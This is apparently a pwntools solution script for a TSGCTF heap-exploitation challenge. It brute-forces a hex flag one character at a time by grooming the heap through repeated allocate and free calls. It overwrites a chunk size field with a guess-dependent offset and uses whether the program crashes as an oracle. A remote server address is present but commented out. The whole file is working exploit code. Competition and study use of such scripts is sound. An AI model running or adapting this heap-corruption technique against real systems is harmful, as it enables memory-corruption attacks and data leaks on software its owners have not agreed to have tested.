from pwn import *

charset = "abcdef0123456789"
flag = ""

a = open("flag", "w")
a.write("TSGCTF{" + "abcdef0123456789" + "0"*(0x10) + "}")
a.close()

for idx in range(7, 7+0x20):

    for guess in charset:
        r = process("./patched")
        #r = remote("35.221.81.216", 30001)
        r.recvuntil("> ")
        r.sendline(str(idx))

        print("IDX", idx, "GUESS", guess)

        def rec():
            return r.recvuntil("> ")

        rec()
        def alloc(idx, size, data):
            r.sendline("0")
            r.sendlineafter("> ", str(idx))
            r.sendlineafter("> ", str(size))
            rec()
            r.sendline(data)
            rec()

        def dealloc(idx):
            r.sendline("1")
            r.sendlineafter("> ", str(idx))
            rec()

        def fag(idx, off):
            r.sendline("2")
            r.sendlineafter("> ", str(idx))
            r.sendlineafter("> ", str(off))
            rec()

        for i in range(7):
            alloc(0, 0x50, "A"*0x10)
            dealloc(0)
            alloc(0, 0x10, "A"*0xf)
            dealloc(0)

        off1 = 73 + (ord(guess) - ord("a"))

        payload = "A"*off1 + p64(0x61)
        alloc(0, 0x60, payload)
        alloc(1, 0x50, cyclic(0x4f))
        dealloc(0)
        alloc(0, 0x10, "DDDD")
        dealloc(0)
        alloc(0, 0x50, "B"*0x10)

        dealloc(1)
        dealloc(0)

        alloc(0, 0x10, "FFFF")
        fag(0, 0x20)
        dealloc(0)

        alloc(0, 0x50, "GGGG")
        try:
            alloc(1, 0x50, "HHHHH") # clobber
        except:
            print("guess wrong")
            r.close()
            continue
        print("guess right")
        flag += guess
        print(flag)
        r.close()
        break


